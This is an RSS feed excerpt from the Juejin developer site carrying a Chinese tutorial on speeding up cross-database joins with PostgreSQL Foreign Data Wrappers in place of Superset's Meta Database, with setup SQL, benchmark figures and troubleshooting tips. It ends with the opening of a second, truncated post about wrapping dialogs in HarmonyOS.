<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[性能提升 40 倍！实战 PostgreSQL FDW 解决微服务跨库查询难题]]></title>    <link>https://juejin.cn/post/7589074117644976163</link>    <guid>https://juejin.cn/post/7589074117644976163</guid>    <pubDate>2025-12-29T14:03:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644976163" data-draft-id="7589093939656769588" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="性能提升 40 倍！实战 PostgreSQL FDW   解决微服务跨库查询难题"/> <meta itemprop="keywords" content="数据库,后端"/> <meta itemprop="datePublished" content="2025-12-29T14:03:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            性能提升 40 倍！实战 PostgreSQL FDW   解决微服务跨库查询难题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:03:03.000Z" title="Mon Dec 29 2025 14:03:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">微服务跨库查询：从 24 秒优化到 0.6 秒，我做了什么</h2>
<p>做运营看板的时候遇到个问题：需要把用户对 AI 回复的评价（点赞/点踩）和用户名一起展示出来。听起来简单，但数据分散在两个库里——评价数据在业务库，用户名在用户库。</p>
<p>第一反应是用 Superset 的跨库查询功能，结果查一次要 24 秒，完全没法用。</p>
<p>折腾了一圈，换成 PostgreSQL FDW 方案，同样的查询 0.6 秒就出来了。40 倍的性能差距。</p>
<p>meta database：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ae71d2ffe8747ef96e83bf243d76cfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621783&amp;x-signature=ELrBYaQnVt4pd75mj4Vi%2FjRyAXA%3D" alt="微信图片_2025-12-29_220005_848_副本.png" loading="lazy"/></p>
<p>FDW：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4918af3e786847b09f99cf12946a2e61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621783&amp;x-signature=LpglZnjMOgZSCf0OlIuF6RN0MYM%3D" alt="微信图片_2025-12-29_220201_695.png" loading="lazy"/></p>
<h3 data-id="heading-1">背景：微服务的数据隔离问题</h3>
<p>我们的系统是典型的微服务架构，三个服务各用各的数据库：</p>
<pre><code class="hljs">innies_biz_dev   → 业务数据（消息、评价、知识库）
innies_users_dev → 用户数据（用户名、邮箱、权限）
innies_loom_dev  → Agent 执行数据
</code></pre>
<p>平时服务间通信走 gRPC，数据隔离得挺好。但做运营看板的时候问题来了：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 需求：展示评价记录，带上用户名</span>
<span class="hljs-keyword">SELECT</span>
    r.rating_type,  <span class="hljs-comment">-- 评价类型（业务库）</span>
    u.username,     <span class="hljs-comment">-- 用户名（用户库）← 跨库了</span>
    m.content       <span class="hljs-comment">-- 消息内容（业务库）</span>
<span class="hljs-keyword">FROM</span> message_ratings r
<span class="hljs-keyword">JOIN</span> users u <span class="hljs-keyword">ON</span> r.user_id <span class="hljs-operator">=</span> u.id
</code></pre>
<p>两个库里的表，没法直接 JOIN。</p>
<h3 data-id="heading-2">第一次尝试：Superset Meta Database</h3>
<p>Superset 有个实验性功能叫 Meta Database，号称可以跨库查询。配置挺简单：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># superset_config.py</span>
FEATURE_FLAGS = {
    <span class="hljs-string">"ENABLE_SUPERSET_META_DB"</span>: <span class="hljs-literal">True</span>,
}
</code></pre>
<p>添加三个数据库连接，再加一个 Meta Database（URI 是 <code>superset://</code>），就可以这样查了：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span>
<span class="hljs-keyword">FROM</span> "innies_biz_dev.public.message_ratings" r
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> "innies_users_dev.public.users" u <span class="hljs-keyword">ON</span> r.user_id <span class="hljs-operator">=</span> u.id
</code></pre>
<p>语法有点怪，整个表路径要用双引号包起来。但能跑就行，对吧？</p>
<p>结果：<strong>24 秒</strong>。</p>
<p>查 13 条数据，等了 24 秒。复杂一点的查询直接超时。</p>
<h3 data-id="heading-3">问题在哪？</h3>
<p>用 EXPLAIN ANALYZE 看了一下数据库层的执行时间：<strong>12 毫秒</strong>。</p>
<p>数据库只花了 12ms，但整个查询要 24 秒。时间都花在哪了？</p>
<p>画个图就明白了：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as Superset
    participant B as 业务库
    participant U as 用户库

    S-&gt;&gt;B: SELECT * FROM message_ratings
    B--&gt;&gt;S: 返回全量数据
    S-&gt;&gt;B: SELECT * FROM task_messages
    B--&gt;&gt;S: 返回全量数据
    S-&gt;&gt;U: SELECT * FROM users
    U--&gt;&gt;S: 返回全量数据
    Note over S: Python 内存中做 JOIN
    S--&gt;&gt;S: 返回结果
</code></pre>
<p>问题就在这：它把所有表的数据都拉到应用层，再用 Python 做 JOIN。</p>
<ul>
<li>多次网络往返</li>
<li>全量数据传输（即使你只要 10 条结果）</li>
<li>Python 做 JOIN（效率远低于数据库引擎）</li>
</ul>
<h3 data-id="heading-4">换方案：PostgreSQL FDW</h3>
<p>FDW（Foreign Data Wrapper）是 PostgreSQL 的内置功能，可以把远程数据库的表映射到本地，像本地表一样查。</p>
<p>关键区别：<strong>JOIN 下沉到了数据库内核层</strong>。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as Superset
    participant P as 本地 PostgreSQL
    participant R as 远程用户库

    S-&gt;&gt;P: SELECT ... JOIN fdw_users.users
    Note over P: 查询优化器分析执行计划
    P-&gt;&gt;R: 拉取需要的行（WHERE 条件下推）
    R--&gt;&gt;P: 返回过滤后的数据
    Note over P: C 引擎内部完成 JOIN
    P--&gt;&gt;S: 返回结果
</code></pre>
<p>虽然在这种跨库场景下（本地表 JOIN 远程表），JOIN 动作依然发生在本地，但它比 Superset 快得多的原因是：</p>
<ol>
<li><strong>内核级效率</strong>：C 语言实现的数据库引擎做 JOIN，比 Python 在内存里处理 Pandas/List 快几个数量级。</li>
<li><strong>按需传输</strong>：PG 优化器很聪明，会把 WHERE 条件下推到远程库，只拉取需要的数据，而不是全量拉取。</li>
<li><strong>协议高效</strong>：数据库内部传输用的是二进制协议，比 HTTP/JSON 高效得多。</li>
</ol>
<h3 data-id="heading-5">配置过程</h3>
<p>FDW 配置需要数据库管理员权限，分这么几步：</p>
<h4 data-id="heading-6">1. 创建外部服务器</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 告诉 PostgreSQL 远程库在哪</span>
<span class="hljs-keyword">CREATE</span> SERVER users_server
<span class="hljs-keyword">FOREIGN</span> DATA WRAPPER postgres_fdw
OPTIONS (
    host <span class="hljs-string">'postgres-cluster.svc.cluster.local'</span>,
    dbname <span class="hljs-string">'innies_users_dev'</span>,
    port <span class="hljs-string">'5432'</span>
);
</code></pre>
<h4 data-id="heading-7">2. 创建用户映射</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 告诉 PostgreSQL 用什么凭证连远程库</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> MAPPING <span class="hljs-keyword">FOR</span> innies_dev
SERVER users_server
OPTIONS (<span class="hljs-keyword">user</span> <span class="hljs-string">'innies_dev'</span>, password <span class="hljs-string">'xxx'</span>);
</code></pre>
<p>这步容易踩坑。如果报 <code>user mapping not found</code>，说明当前用户没有对应的映射。</p>
<h4 data-id="heading-8">3. 导入外部表</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 把远程的 users 表映射过来，放到 fdw_users schema</span>
<span class="hljs-keyword">CREATE</span> SCHEMA IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> fdw_users;

IMPORT <span class="hljs-keyword">FOREIGN</span> SCHEMA public
LIMIT <span class="hljs-keyword">TO</span> (users)
<span class="hljs-keyword">FROM</span> SERVER users_server
<span class="hljs-keyword">INTO</span> fdw_users;
</code></pre>
<h4 data-id="heading-9">4. 创建视图</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 封装 JOIN 逻辑，方便使用</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> v_ratings_with_username <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span>
    r.created_at <span class="hljs-keyword">AS</span> 评价时间,
    r.rating_type <span class="hljs-keyword">AS</span> 评价类型,
    u.username <span class="hljs-keyword">AS</span> 用户名,
    SUBSTR(m.content, <span class="hljs-number">1</span>, <span class="hljs-number">200</span>) <span class="hljs-keyword">AS</span> 消息内容,
    <span class="hljs-keyword">CASE</span>
        <span class="hljs-keyword">WHEN</span> m.references <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
         <span class="hljs-keyword">AND</span> m.references::text <span class="hljs-operator">!=</span> <span class="hljs-string">'[]'</span>
        <span class="hljs-keyword">THEN</span> <span class="hljs-string">'是'</span>
        <span class="hljs-keyword">ELSE</span> <span class="hljs-string">'否'</span>
    <span class="hljs-keyword">END</span> <span class="hljs-keyword">AS</span> 使用知识库
<span class="hljs-keyword">FROM</span> message_ratings r
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> task_messages m <span class="hljs-keyword">ON</span> r.message_id <span class="hljs-operator">=</span> m.id
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> fdw_users.users u <span class="hljs-keyword">ON</span> r.user_id::uuid <span class="hljs-operator">=</span> u.id
<span class="hljs-keyword">WHERE</span> m.role <span class="hljs-operator">=</span> <span class="hljs-string">'assistant'</span>;
</code></pre>
<p>配置完成后，在 Superset 里直接查这个视图就行：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> v_ratings_with_username LIMIT <span class="hljs-number">100</span>;
</code></pre>
<h3 data-id="heading-10">结果对比</h3>




















<table><thead><tr><th>方案</th><th>查询耗时</th><th>数据库耗时</th></tr></thead><tbody><tr><td>Superset Meta DB</td><td>21-24s</td><td>12ms</td></tr><tr><td>PostgreSQL FDW</td><td>0.5-0.8s</td><td>0.5s</td></tr></tbody></table>
<p><strong>40 倍的性能提升。</strong></p>
<h3 data-id="heading-11">踩过的坑</h3>
<h4 data-id="heading-12">1. 权限不够</h4>
<pre><code class="hljs language-lua" lang="lua">permission denied to <span class="hljs-built_in">create</span> extension <span class="hljs-string">"postgres_fdw"</span>
</code></pre>
<p>创建 FDW 扩展需要超级用户权限，得让 DBA 帮忙。</p>
<h4 data-id="heading-13">2. 用户映射找不到</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">user</span> mapping <span class="hljs-keyword">not</span> found <span class="hljs-keyword">for</span> <span class="hljs-keyword">user</span> "innies_dev"
</code></pre>
<p>DBA 配好了 FDW，但只给 <code>postgres</code> 用户创建了映射，没给应用用户创建。补一个就好：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> MAPPING <span class="hljs-keyword">FOR</span> innies_dev
SERVER users_server
OPTIONS (<span class="hljs-keyword">user</span> <span class="hljs-string">'innies_dev'</span>, password <span class="hljs-string">'xxx'</span>);
</code></pre>
<h4 data-id="heading-14">3. 表找不到</h4>
<pre><code class="hljs language-arduino" lang="arduino">relation <span class="hljs-string">"users"</span> does <span class="hljs-keyword">not</span> exist
</code></pre>
<p>外部表被导入到了 <code>fdw_users</code> schema，不是 <code>public</code>。查的时候要用 <code>fdw_users.users</code>。</p>
<h3 data-id="heading-15">什么时候用哪个方案</h3>

























<table><thead><tr><th>场景</th><th>推荐方案</th></tr></thead><tbody><tr><td>数据量小、偶尔查一次</td><td>Superset Meta DB 够用</td></tr><tr><td>需要秒级响应</td><td>PostgreSQL FDW</td></tr><tr><td>可以接受数据延迟</td><td>定时同步到一个库</td></tr><tr><td>大规模数据分析</td><td>搞个数据仓库（成本高）</td></tr></tbody></table>
<h3 data-id="heading-16">总结</h3>
<p>同样的 JOIN，在应用层做和在数据库层做，性能差距可以到 40 倍。</p>
<p>微服务架构的数据隔离是好事，但做跨服务报表的时候确实麻烦。FDW 是个不错的解决方案：</p>
<ul>
<li>配置一次，长期使用</li>
<li>实时数据，无需同步</li>
<li>对线上库影响很小</li>
<li>PostgreSQL 内置功能，不用额外装东西</li>
</ul>
<p>代价是需要 DBA 权限来配置，但这个一次性成本是值得的。</p>
<hr/>
<p>如果你觉得这篇文章有帮助，欢迎关注我的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>，下面是我的一些开源项目：</p>
<p><strong>Claude Code Skills</strong>（按需加载，意图自动识别，不浪费 token，<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">介绍文章</a>）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - 代码审查技能，覆盖 React 19、Vue 3、TypeScript、Rust 等约 9000 行规则（<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">详细介绍</a>）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys 根因分析，说"找根因"自动激活</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - 第一性原理思考，适合架构设计和技术选型</li>
</ul>
<p><strong>全栈项目</strong>（适合学习现代技术栈）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt 管理器，用的都是最新的技术栈，适合用来学习了解最新的前端全栈开发范式：Next.js 15 + React 19 + tRPC 11 + Supabase 全栈示例，clone 下来配个免费 Supabase 就能跑</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - 双模式 AI 应用（聊天+富文本编辑），Vue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：弹窗封装]]></title>    <link>https://juejin.cn/post/7589201772118081542</link>    <guid>https://juejin.cn/post/7589201772118081542</guid>    <pubDate>2025-12-29T14:05:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772118081542" data-draft-id="7589159665856151571" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：弹窗封装"/> <meta itemprop="keywords" content="HarmonyOS,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:05:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：弹窗封装
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:05:51.000Z" title="Mon Dec 29 2025 14:05:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>本示例介绍如何封装弹窗，以及如何使用这种封装后的弹窗</p>
<h3 data-id="heading-1">效果图预览</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/466dabaee01c49048c3baef9ed3a8893~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621950&amp;x-signature=bbc9l1ef9wj6ofCK21BRD6h5vvU%3D" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<ol>
